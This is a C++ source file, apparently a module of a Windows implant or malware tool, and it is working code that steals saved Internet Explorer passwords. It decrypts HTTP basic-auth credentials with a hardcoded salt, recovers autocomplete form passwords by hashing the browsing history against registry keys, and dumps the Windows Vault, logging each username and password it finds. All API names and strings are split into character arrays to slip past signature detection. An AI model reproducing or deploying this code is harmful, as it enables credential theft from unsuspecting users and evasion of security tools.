#include <Windows.h>
#include <Urlhist.h>

#include "globals.h"
#include "password.h"
#include "zmem.h"
#include "utils.h"
#include "proto.h"
#include "password.h"
#include "ie_password.h"
#include "debug.h"

CryptUnprotectData_t fpCryptUnprotectData = NULL;
CredEnumerate_t fpCredEnumerateW = NULL;
CredFree_t fpCredFree = NULL;

DWORD GetIEUrlHistory(LPWSTR *strUrlHistory)
{
	HRESULT hr;
	DWORD dwMax = 0;
	IUrlHistoryStg2* pUrlHistoryStg2 = NULL;

	hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC_SERVER, IID_IUrlHistoryStg2, (LPVOID *)&pUrlHistoryStg2);
	if (!SUCCEEDED(hr))
		return 0;

	IEnumSTATURL *pEnumUrls;
	hr = pUrlHistoryStg2->EnumUrls(&pEnumUrls);
	if (SUCCEEDED(hr))
	{
		ULONG uOut;
		STATURL pStatUrl[1];

		while (dwMax < MAX_URL_HISTORY && (hr = pEnumUrls->Next(1, pStatUrl, &uOut)) == S_OK)
		{
			if (pStatUrl->pwcsUrl && !(pStatUrl->dwFlags & STATURL_QUERYFLAG_NOURL))
			{
				LPWSTR strTmp = wcschr(pStatUrl->pwcsUrl, L'?');
				if (strTmp != NULL)
					*strTmp = L'\0';

				strUrlHistory[dwMax] = (LPWSTR) zalloc((wcslen(pStatUrl->pwcsUrl)+1)*sizeof(WCHAR));
				if (strUrlHistory[dwMax])
				{
					wcscpy_s(strUrlHistory[dwMax], wcslen(pStatUrl->pwcsUrl)+1, pStatUrl->pwcsUrl);
					for (DWORD i=0; strUrlHistory[dwMax][i]; i++)
						strUrlHistory[dwMax][i] = tolower(strUrlHistory[dwMax][i]);
					dwMax++;
				}
			}
			if (pStatUrl->pwcsUrl && !(pStatUrl->dwFlags & STATURL_QUERYFLAG_NOURL))
				CoTaskMemFree(pStatUrl->pwcsUrl);
			if (pStatUrl->pwcsTitle && !(pStatUrl->dwFlags & STATURL_QUERYFLAG_NOTITLE))
				CoTaskMemFree(pStatUrl->pwcsTitle);
		}
		pEnumUrls->Release();
	}
	pUrlHistoryStg2->Release();

	return dwMax;
}

VOID ParseIEBlob(DATA_BLOB *lpDataBlob, LPWSTR strUrl, LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	LPBYTE pData = lpDataBlob->pbData;
	DWORD dwHeaderSize, dwDataSize, dwStringNum;

	memcpy(&dwHeaderSize, &pData[4], sizeof(DWORD));
	memcpy(&dwDataSize, &pData[8], sizeof(DWORD));
	memcpy(&dwStringNum, &pData[20], sizeof(DWORD));

	if (dwHeaderSize >= lpDataBlob->cbData ||  lpDataBlob->cbData < 41)
		return;

	LPBYTE pAuthInfo = &pData[36];
	LPBYTE pAuthData = &pData[dwHeaderSize];

	DWORD dwOffset;
	LPWSTR strUser = (LPWSTR) zalloc(1024*sizeof(WCHAR));
	LPWSTR strPass = (LPWSTR) zalloc(1024*sizeof(WCHAR));

	for (; dwStringNum>0; dwStringNum-=2)
	{
		strPass[0] = strUser[0] = L'\0';

		if (dwStringNum>=1)
		{
			memcpy(&dwOffset, pAuthInfo, sizeof(DWORD));
			if (dwHeaderSize + 12 + dwOffset >= lpDataBlob->cbData)
				return;

			_snwprintf_s(strUser, 1024, _TRUNCATE, L"%s", &pData[dwHeaderSize + 12 + dwOffset]);
			pAuthInfo+=16;
		}
		if (dwStringNum >= 2)
		{
			memcpy(&dwOffset, pAuthInfo, sizeof(DWORD));
			if (dwHeaderSize + 12 + dwOffset >= lpDataBlob->cbData)
				return;

			_snwprintf_s(strPass, 1024, _TRUNCATE, L"%s", &pData[dwHeaderSize + 12 + dwOffset]);
			pAuthInfo+=16;
		}
		// LogPassword
		WCHAR strIE[] = { L'I', L'E', L'x', L'p', L'l', L'o', L'r', L'e', L'r', L'\0' };
		PasswordLogEntry(strIE, strUrl, strUser, strPass, lpBuffer, dwBuffSize);
	}

	zfree(strUser);
	zfree(strPass);
}


VOID DumpIE7Passwords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	WCHAR strApp[] = { L'I', L'E', L'x', L'p', L'l', L'o', L'r', L'e', L'r', L' ', L'H', L'T', L'T', L'P', L' ', L'A', L'u', L't', L'h', L'\0' };
	WCHAR strFilter[] = { L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'_', L'W', L'i', L'n', L'I', L'n', L'e', L't', L'_', L'*', L'\0' };
	CHAR strSalt[] = { 'a', 'b', 'e', '2', '8', '6', '9', 'f', '-', '9', 'b', '4', '7', '-', '4', 'c', 'd', '9', '-', 'a', '3', '5', '8', '-', 'c', '2', '2', '9', '0', '4', 'd', 'b', 'a', '7', 'f', '7', 0x0 };
	
	// http basic auth
	DATA_BLOB pOptionalEntry, pDataIn, pDataOut;

	SHORT strXorSalt[37];
	for (DWORD i=0; i<37; i++)
		strXorSalt[i] = (SHORT) (strSalt[i] * 4);
	pOptionalEntry.pbData = (LPBYTE) strXorSalt;
	pOptionalEntry.cbData = 74;

	DWORD dwCount = 0;
	PCREDENTIAL *pCredentials = NULL;
	fpCredEnumerateW(strFilter, 0, &dwCount, &pCredentials);
	for (DWORD dwIdx=0; dwIdx<dwCount; dwIdx++)
	{
		LPWSTR strPtr = NULL;
		if (pCredentials[dwIdx]->TargetName)
		{
			strPtr = (LPWSTR) pCredentials[dwIdx]->TargetName;
			strPtr += (wcslen(strFilter)-1);
		}

		pDataIn.pbData = pCredentials[dwIdx]->CredentialBlob;
		pDataIn.cbData = pCredentials[dwIdx]->CredentialBlobSize;

		if (fpCryptUnprotectData == NULL)
			IEPasswordResolveApi();

		if (fpCryptUnprotectData && fpCryptUnprotectData(&pDataIn, NULL, &pOptionalEntry, NULL, NULL, 0, &pDataOut))
		{
			WCHAR strUser[1024];
			LPWSTR strPass;
			_snwprintf_s(strUser, sizeof(strUser)/sizeof(WCHAR), L"%s", pDataOut.pbData);
			strPass = wcschr(strUser, L':');
			if (strPass)
			{
				*strPass = 0x0; strPass++;
				PasswordLogEntry(strApp, strPtr, strUser, strPass, lpBuffer, dwBuffSize);
				LocalFree(pDataOut.pbData);
			}
		}
	}
	if (pCredentials)
		fpCredFree(pCredentials); 

	// web forms
	HKEY hKey;
	WCHAR strKey[] = {L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'I', L'n', L't', L'e', L'r', L'n', L'e', L't', L' ', L'E', L'x', L'p', L'l', L'o', L'r', L'e', L'r', L'\\', L'I', L'n', L't', L'e', L'l', L'l', L'i', L'F', L'o', L'r', L'm', L's', L'\\', L'S', L't', L'o', L'r', L'a', L'g', L'e', L'2', L'\0'};
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strKey, 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS)
		return;

	// get history
	LPWSTR strUrlHistory[1024];
	DWORD dwEntries = GetIEUrlHistory((LPWSTR *)&strUrlHistory);

	DWORD dwKeyIdx = 0;
	DWORD dwSize = 1024;
	LPSTR strValueName = (LPSTR) zalloc(1024*sizeof(WCHAR)); // FIXME zappa sizeof(WCHAR)
	LPSTR strHash = (LPSTR) zalloc(1024);

	while (RegEnumValueA(hKey, dwKeyIdx, strValueName, &dwSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
	{
		for (DWORD i=0; i<dwEntries; i++)
		{
			GetHashStr(strUrlHistory[i], strHash);
			if (!strcmp(strValueName, (LPSTR)strHash))
			{
				DWORD dwCryptPwdLen;
				DWORD dwType;

				RegQueryValueExA(hKey, strValueName, 0, &dwType, NULL, &dwCryptPwdLen);
				if (!dwCryptPwdLen)
					break;

				LPBYTE lpCryptPwd = (LPBYTE) zalloc(dwCryptPwdLen);
				if (!lpCryptPwd)
					continue;

				if (RegQueryValueExA(hKey, strValueName, 0, &dwType, lpCryptPwd, &dwCryptPwdLen) == ERROR_SUCCESS)
				{
					pDataIn.pbData = lpCryptPwd;
					pDataIn.cbData = dwCryptPwdLen;
					pOptionalEntry.pbData = (LPBYTE) strUrlHistory[i];
					pOptionalEntry.cbData = (DWORD) (wcslen(strUrlHistory[i])+1)*sizeof(WCHAR);

					if (fpCryptUnprotectData == NULL)
						IEPasswordResolveApi();

					if (fpCryptUnprotectData && fpCryptUnprotectData(&pDataIn, 0, &pOptionalEntry, NULL, NULL, 1, &pDataOut))
						ParseIEBlob(&pDataOut, strUrlHistory[i], lpBuffer, dwBuffSize);
				}
				zfree(lpCryptPwd);
			}
		}
		dwKeyIdx++;
		dwSize = 1024;
	}

	RegCloseKey(hKey);

	for (DWORD i=0; i<dwEntries; i++)
		zfree(strUrlHistory[i]);

	zfree(strValueName);
	zfree(strHash);
}


VOID DumpIEVault(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
	GUID gVault, gSchema;
	WCHAR strVaultCli[] = { L'v', L'a', L'u', L'l', L't', L'c', L'l', L'i', L'\0' };
	WCHAR strVault[] = { L'{', L'4', L'B', L'F', L'4', L'C', L'4', L'4', L'2', L'-', L'9', L'B', L'8', L'A', L'-', L'4', L'1', L'A', L'0', L'-', L'B', L'3', L'8', L'0', L'-', L'D', L'D', L'4', L'A', L'7', L'0', L'4', L'D', L'D', L'B', L'2', L'8', L'}', L'\0' };
	WCHAR strSchema[] = { L'{', L'3', L'C', L'C', L'D', L'5', L'4', L'9', L'9', L'-', L'8', L'7', L'A', L'8', L'-', L'4', L'B', L'1', L'0', L'-', L'A', L'2', L'1', L'5', L'-', L'6', L'0', L'8', L'8', L'8', L'8', L'D', L'D', L'3', L'B', L'5', L'5', L'}', L'\0' };

	if (CLSIDFromString(strVault, &gVault))
		return;
	if (CLSIDFromString(strSchema, &gSchema))
		return;
	
	HMODULE hMod = LoadLibrary(strVaultCli);
	if (hMod == NULL)
		return;

	CHAR strVaultOpenVault[] = { 'V', 'a', 'u', 'l', 't', 'O', 'p', 'e', 'n', 'V', 'a', 'u', 'l', 't', 0x0 };
	CHAR strVaultEnumerateItems[] = { 'V', 'a', 'u', 'l', 't', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'I', 't', 'e', 'm', 's', 0x0 };
	CHAR strVaultGetItem[] = { 'V', 'a', 'u', 'l', 't', 'G', 'e', 't', 'I', 't', 'e', 'm', 0x0 };
	CHAR strVaultCloseVault[] = { 'V', 'a', 'u', 'l', 't', 'C', 'l', 'o', 's', 'e', 'V', 'a', 'u', 'l', 't', 0x0 };
	CHAR strVaultFree[] = { 'V', 'a', 'u', 'l', 't', 'F', 'r', 'e', 'e', 0x0 };

	VaultOpenVault_t fpVaultOpenVault = (VaultOpenVault_t) GetProcAddress(hMod, strVaultOpenVault); 
	VaultEnumerateItems_t fpVaultEnumerateItems = (VaultEnumerateItems_t) GetProcAddress(hMod, strVaultEnumerateItems); 
	VaultGetItem_t fpVaultGetItem = (VaultGetItem_t) GetProcAddress(hMod, strVaultGetItem); 
	VaultCloseVault_t fpVaultCloseVault = (VaultCloseVault_t) GetProcAddress(hMod, strVaultCloseVault); 
	VaultFree_t fpVaultFree = (VaultFree_t) GetProcAddress(hMod, strVaultFree); 

	if (!fpVaultOpenVault || !fpVaultEnumerateItems || !fpVaultGetItem || !fpVaultCloseVault || !fpVaultFree)
		return;

	DWORD dwItemCount;
	LPVOID vHandle = NULL;
	if (fpVaultOpenVault(&gVault, 0, &vHandle) != S_OK)
		return;

	LPVAULT_CRED pVaultCred = NULL;
	if (fpVaultEnumerateItems(vHandle, 0x200, &dwItemCount, &pVaultCred) == S_OK)
	{
		for (DWORD i=0; i<dwItemCount; i++)
		{
			LPVAULT_CRED pVaultCredFull = NULL;
			if (fpVaultGetItem(vHandle, &gSchema, pVaultCred[i].lpResource, pVaultCred[i].lpUser, 0, 0, 0, &pVaultCredFull) == S_OK)
			{
				WCHAR strIE[] = { L'I', L'E', L'x', L'p', L'l', L'o', L'r', L'e', L'r', L'\0' };
				PasswordLogEntry(strIE, pVaultCred[i].lpResource->strName, pVaultCred[i].lpUser->strName, pVaultCredFull->lpPassword->strName, lpBuffer, dwBuffSize);
				fpVaultFree(pVaultCredFull);
			}
		}
		fpVaultFree(pVaultCred);
	}

	fpVaultCloseVault(&vHandle);
}

BOOL IEPasswordResolveApi()
{
	CHAR strCredFree[] = { 'C', 'r', 'e', 'd', 'F', 'r', 'e', 'e', 0x0 };
	WCHAR strCrypt[] = { L'c', L'r', L'y', L'p', L't', L'3', L'2', L'\0' };
	WCHAR strAdvapi[] = { 'A', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'\0' };
	CHAR strCredEnumerateW[] = { 'C', 'r', 'e', 'd', 'E', 'n', 'u', 'm', 'e', 'r', 'a', 't', 'e', 'W', 0x0 };
	CHAR strCryptUnprotectData[] = { 'C', 'r', 'y', 'p', 't', 'U', 'n', 'p', 'r', 'o', 't', 'e', 'c', 't', 'D', 'a', 't', 'a', 0x0 };

	HMODULE hCrypt = LoadLibrary(strCrypt);
	HMODULE hAdvapi = LoadLibrary(strAdvapi);
	if (!hCrypt || !hAdvapi)
		return FALSE;

	fpCryptUnprotectData = (CryptUnprotectData_t) GetProcAddress(hCrypt, strCryptUnprotectData);
	fpCredEnumerateW = (CredEnumerate_t) GetProcAddress(hAdvapi, strCredEnumerateW);
	fpCredFree = (CredFree_t) GetProcAddress(hAdvapi, strCredFree);

	if (!fpCryptUnprotectData || !fpCredEnumerateW || !fpCredFree)
		return FALSE;

	return TRUE;
}


VOID DumpIEPasswords(LPBYTE *lpBuffer, LPDWORD dwBuffSize)
{
#ifdef _DEBUG
	OutputDebug(L"[*] Dumping IE passwords\n");
#endif
	if (!IEPasswordResolveApi())
	{
#ifdef _DEBUG
		OutputDebug(L"[!!] IEPasswordResolveApi failed\n");
#endif
		return;
	}

	DumpIE7Passwords(lpBuffer, dwBuffSize);
	DumpIEVault(lpBuffer, dwBuffSize); // ie >= 10
}